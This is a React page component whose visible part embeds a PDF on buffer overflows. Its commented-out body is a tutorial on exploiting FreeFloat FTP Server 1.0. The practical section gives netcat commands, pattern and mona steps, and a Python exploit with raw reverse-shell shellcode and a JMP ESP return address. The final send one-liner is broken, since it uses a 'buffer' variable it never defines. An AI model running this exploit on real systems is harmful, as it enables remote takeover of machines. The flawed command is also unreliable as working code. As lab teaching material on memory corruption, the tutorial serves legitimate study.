'use client';
import React from 'react'


const page = () => {
    return (
        <div className='w-full my-32 sm:my-48 px-8 sm:px-32 overflow-hidden'>
            <h1 className='text-4xl sm:text-6xl my-8 tracking-tighter'>Buffer Overflow Exploitation in FreeFloat FTP Server</h1>

            <iframe
                src="/Buffer-overflow.pdf"
                className='w-full h-[600px] sm:h-[1000px] border-none'
            />

            {/* <h2 className='text-2xl sm:text-3xl tracking-tighter my-2 pt-12'>Stack Buffer Overflow Theory</h2>
            <p>Stack buffer overflow is a memory corruption vulnerability that occurs when a program writes more data to a buffer located on the stack than what is actually allocated for that buffer, therefore overflowing to a memory address that is outside of the intended data structure.</p>
            <p>This will often cause the program to crash, and if certain conditions are met, it could allow an attacker to gain remote control of the machine with privileges as high as the user running the program, by redirecting the flow execution of the application to malicious code.</p>
            <p>Before diving into an actual attack, it is crucial to understand basic concepts of C programming such as memory, the stack, CPU registers, pointers and what happens behind the scenes, in order to take advantage of a memory corruption to compromise a system.</p>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>The Stack</h2>
            <p>The stack is a section of memory that stores temporary data, that is executed when a function is called.</p>
            <p>The stack always grows downwards towards lower values as new information is added to it. The ESP CPU register points to the lowest part of the stack and anything below it is free memory that can be overwritten, which is why it is often exploited by injecting malicious code into it.</p>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>CPU Registers</h2>
            <p>Registers are CPU variables that store single records, there are a fixed number of registers that are used for different purposes and they all have a specific location in the CPU.</p>
            <p>Registers can hold pointers which point to memory addresses containing certain instructions for the program to perform, this can be exploited by using a jump instruction to move to a different memory location containing malicious code.</p>
            <p>Intel assembly has 8 general purpose and 2 special purpose 32-bit register. Different compilers may have different uses for the registers, the ones listed below are used in Microsoft’s compiler:</p>
            <ul className='my-8 mx-auto sm:px-24'>
                <li><strong>EAX</strong>: General Purpose - Stores the return value of a function.</li>
                <li><strong>EBX</strong>: General Purpose - No specific uses, often set to a commonly used value in a function to speed up calculations.</li>
                <li><strong>ECX</strong>: General Purpose - Occasionally used as a function parameter and often used as a loop counter.</li>
                <li><strong>EDX</strong>: General Purpose - Occasionally used as a function parameter, also used for storing short-term variables in a function.</li>
                <li><strong>ESI</strong>: General Purpose - Used as a pointer, points to the source of instructions that require a source and destination.</li>
                <li><strong>EDI</strong>: General Purpose - Often used as a pointer. Points to the destination of instructions that require a source and destination.</li>
                <li><strong>EBP</strong>: General Purpose - Has two uses depending on compile settings, it is either the frame pointer or a general purpose register for storing of data used in calculations.</li>
                <li><strong>ESP</strong>: General Purpose - A special register that stores a pointer to the top of the stack (virtually under the end of the stack).</li>
                <li><strong>EIP</strong>: Special purpose - Stores a pointer to the address of the instruction that the program is currently executing. After each instruction, a value equal to its size is added to EIP, meaning it points at the machine code for the next instruction.</li>
                <li><strong>FLAGS</strong>: Special purpose - Stores meta-information about the results of previous operations i.e. whether it overflowed the register or whether the operands were equal.</li>
            </ul>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Pointers</h2>
            <p>A pointer is, a variable that stores a memory address as its value, which will correspond to a certain instruction the program will have to perform. The value of the memory address can be obtained by “dereferencing” the pointer.</p>
            <p>They are used in buffer overflow attacks to redirect the execution flow to malicious code through a pointer that points at a JMP instruction.</p>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Common Instructions</h2>
            <p>This section covers some of the most common assembly instructions, their purpose in a program and some example uses:</p>
            <ul>
                <li><strong>Pointers and Dereferencing</strong>: Since registers simply store values, they may or may not be used as pointers, depending on the information stored. If being used as a pointer, registers can be dereferenced, retrieving the value stored at the address being pointed to. Example: Movq, movb.</li>
                <li><strong>Doing nothing</strong>: The NOP instruction, short for “no operation”, simply does nothing. Example: NOP.</li>
                <li><strong>Moving data around</strong>: Used to move values and pointers. Example: Mov, movsx, movzx, lea.</li>
                <li><strong>Math and logic</strong>: Used for math and logic. Some are simple arithmetic operations and some are complex calculations. Example: Add, sub, inc, dec, and.</li>
                <li><strong>Jumping around</strong>: Used mainly to perform jumps to certain memory locations, it stores the address to jump to. Example: Jmp, call, ret, cmp, test.</li>
                <li><strong>Manipulating the stack</strong>: Used for adding and removing data from the stack. Example: Push, pop, pushaw.</li>
            </ul>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Stack Buffer Overflow Process</h2>
            <p>Although applications require a custom exploit to be crafted in order to gain remote access, most stack buffer overflow exploitation, at a high level, involve the following phases:</p>
            <p>The next section will cover these phases in great detail, from both a theoretical and practical standpoint.</p>

            <h2 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Practical Example </h2>
            <p>This practical example will demonstrate how to exploit a stack buffer overflow vulnerability that affected FreeFloat FTP Server 1.0, an FTP server application. According to the exploit’s author, the crash occurs when sending the following information to the server:</p>
            <ul>
                <li>USER + [arbitrary username]</li>
                <li>PASS + [arbitrary password]</li>
                <li>REST (used to restart a file transfer from a specified point) + 300+ bytes</li>
            </ul>
            <p>The entire exploitation process will be conducted using Immunity Debugger, which is free.</p>

            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Crashing the application</h3>
            <p>First of all, we have to cause the application to crash, in order to ascertain there is a buffer overflow vulnerability and this can be further exploited to gain remote access.</p>
            <p>Once the FreeFloat FTP Server executable has been downloaded, it can be run by double-clicking it:</p>
            <p>This will start the FTP server and open port 21 for incoming connections.</p>
            <p>Starting the Immunity Debugger, selecting the File → Attach option to attach it to the FreeFloat FTP process:</p>
            <img src="/path/to/your/diagram1.png" alt="Diagram 1" />
            <p>Once the debugger has been attached to the process, it will enter a pause state. In order to start its execution, the Debug → Run option can be used:</p>
            <img src="/path/to/your/diagram2.png" alt="Diagram 2" />
            <p>Immunity Debugger uses the following panes used to display information:</p>
            <ul>
                <li>Top-Left Pane – It contains the instruction offset, the original application code, its assembly instruction and comments added by the debugger.</li>
                <li>Bottom-Left Pane – It contains the hex dump of the application itself.</li>
                <li>Top-Right Pane – It contains the CPU registers and their current value.</li>
                <li>Bottom-Right Pane – It contains the stack and its current values.</li>
            </ul>
            <p className='mb-4'>After running the executable and selecting the Debug → Run option, the server can be interacted with by using the netcat tool. To do so, simply execute the following command:</p>
            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2' >nc [target_ip] 21</code>
            <p className='my-4'>Sending the string that triggers the crash will have the following format:</p>
            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>USER hacker<br />PASS pass<br />REST AAAA..</code>
            <p className='mt-4'>The process will now enter a paused state in Immunity Debugger.</p>

            <h3 className='text-lg sm:text-3xl tracking-tighter my-2 pt-12'>Finding the offset </h3>
            <p>When the process crashes, we can see the value stored in the EIP register and the current instruction offset:</p>
            <img src="/path/to/your/diagram3.png" alt="Diagram 3" />
            <p>By checking the value of the EIP register we can see that it contains 41414141, which is the ASCII value for “AAAA”. This means that the value we used to overflow the buffer was used to overwrite the return address of the program.</p>
            <p>In order to identify the exact point at which the overflow occurs, we will use a pattern matching tool called pattern_create.rb to create a unique pattern of 500 bytes.</p>
            <p>This pattern will then be sent to the FTP server to crash the process again.</p>
            <p className='mb-4'>Using the command:</p>
            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500</code>
            <p className='mt-4'>Copy the pattern created by the tool and replace the 300+ bytes in the original request with the pattern. This pattern will allow us to identify the exact point of the overflow. Once the FTP server crashes, Immunity Debugger will show the value that overwrites the EIP register.</p>

            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Redirecting execution flow</h3>
            <p>To redirect the flow of execution to our shellcode, we will need to overwrite the EIP register with a pointer to a memory location that contains a JMP ESP instruction.</p>
            <p>The following immunity debugger script can be used to find a memory location with a JMP ESP instruction:</p>
            <pre>!mona jmp -r esp</pre>
            <p>By using the address returned by the script, we will be able to overwrite the EIP register and redirect execution flow to our shellcode stored in the stack.</p>

            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Crafting the payload</h3>
            <p>The final payload will contain the following components:</p>
            <ul>
                <li>The initial 260 bytes of the buffer.</li>
                <li>The 4 bytes to overwrite the EIP register with the address of the JMP ESP instruction.</li>
                <li>The shellcode to spawn a reverse shell.</li>
            </ul>
            <p className='mb-12'>The final payload can be constructed using the following Python script:</p>
            <pre>
                <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2 overflow-x-scroll sm:overflow-x-auto'>
                    import struct

                    buffer = "A" * 260

                    eip = struct.pack("I", 0x625011af) # Address of JMP ESP instruction
                    shellcode = ("\xdb\xd4\xba\x88\xb1\x10\xca\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
                    "\x52\x31\x56\x17\x03\x56\x17\x83\xca\x91\x36\x27\xf6\x72\x34"
                    "\xc8\xf6\x83\x59\x40\x13\xb2\x59\x36\x50\xe5\x69\x3c\x34\x0a"
                    "\x01\x10\xac\x99\x67\xbd\xc3\x2a\xcd\x9b\xea\xab\x7e\xdf\x6d"
                    "\x2f\x7d\x0c\x4d\x0e\x4e\x41\x8c\x57\xb3\xa8\xdc\x00\xbf\x1f"
                    "\xf0\x25\xf5\xa3\x7b\x75\x1b\xa4\x98\xce\x1a\x85\x0f\x44\x45"
                    "\x05\xae\x89\xfd\x0c\xa8\xce\x38\xc6\x43\x24\xb6\xd9\x85\x74"
                    "\x37\x75\xe8\xb8\xca\x87\x2d\x7e\x35\xf2\x47\x7c\xc8\x05\x9c"
                    "\xfe\x16\x83\x06\x58\xdc\x33\xe2\x58\x31\xa5\x61\x56\xfe\xa1"
                    "\x2e\x7a\x01\x65\x45\x86\x8a\x88\x89\x0e\xc8\xae\x0d\x4a\x8a"
                    "\xcf\x14\x36\x7d\xef\x46\x99\x22\x55\x0d\x34\x36\xe4\x4c\x51"
                    "\xfb\xc5\x6e\xa1\x93\x5e\x1d\x93\x3c\xf5\x89\x9f\xb5\xd3\x4e"
                    "\xdf\xef\xa4\xc0\x1e\x10\xd5\xc9\xe4\x44\x85\x61\xcc\xe4\x4e"
                    "\x71\xf1\x30\xc0\x21\x5d\xeb\xa1\x91\x1d\x5b\x4a\xfb\x91\x84"
                    "\x6a\x04\x78\xad\x01\xff\xeb\x72\x7d\xe5\x10\x1b\x7c\x05\x05"
                    "\x76\x09\xe3\x6f\x96\x5f\xbc\x07\x0f\xfa\x36\xb9\xd0\xd0\x33"
                    "\xf9\x5b\xd7\xc4\xb4\xab\x92\xd6\x21\x5c\xe9\x84\xe4\x63\xc7"
                    "\xa0\x6b\xf1\x8c\x30\xe5\xea\x1a\x67\xa2\xdd\x52\xed\x5e\x47"
                    "\xcd\x13\xa3\x11\x36\x97\x78\xe2\xb9\x16\x0c\x5e\x9e\x08\xc8"
                    "\x5f\x9a\x7c\x84\x36\x74\x2a\x62\xe1\x36\x84\x3c\x5e\x91\x40"
                    "\xb8\xac\x22\x16\xc5\xf8\xd4\xf6\x74\x55\xa1\x09\xb8\x31\x25"
                    "\x72\xa4\xa1\xca\xa9\x6c\xd1\x80\xef\xc5\x7a\x4d\x7a\x54\xe7"
                    "\x6e\x51\x99\x1e\xed\x53\x62\xe5\xed\x16\x67\xa1\xa9\xcb\x15"
                    "\xba\x5f\xeb\x8a\xbb\x75")
                    buffer += eip + "\x90" * 20 + shellcode
                    print buffer
                </code>
            </pre>


            <h3 className='text-xl sm:text-3xl tracking-tighter my-2 pt-12'>Exploiting the vulnerability </h3>
            <p>By sending the payload to the FTP server, the EIP register will be overwritten with the address of the JMP ESP instruction, redirecting the execution flow to the shellcode. This will spawn a reverse shell on the target machine.</p>
            <p className='mb-8'>The following command can be used to send the payload to the FTP server:</p>
            <code className='text-xs sm:text-sm font-bold bg-gray-200 px-2'>python -c "print 'USER anonymous\\r\\nPASS anonymous\\r\\nREST ' + buffer + '\\r\\n'" | nc [target_ip] 21</code>

            <p className='mt-8'>Note: Replace [target_ip] with the IP address of the target machine.</p> */}
        </div>
    )
}

export default page